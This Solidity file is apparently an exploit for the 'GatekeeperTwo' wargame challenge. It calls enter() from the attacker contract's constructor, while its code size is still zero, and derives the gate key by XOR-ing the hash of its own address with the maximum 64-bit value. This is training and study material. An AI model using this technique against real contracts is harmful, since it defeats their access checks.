// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    IGatekeeperTwo public challenge;

    constructor(address challengeAddress) {
        challenge = IGatekeeperTwo(challengeAddress);
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max;
        challenge.enter(bytes8(key));
    }
}
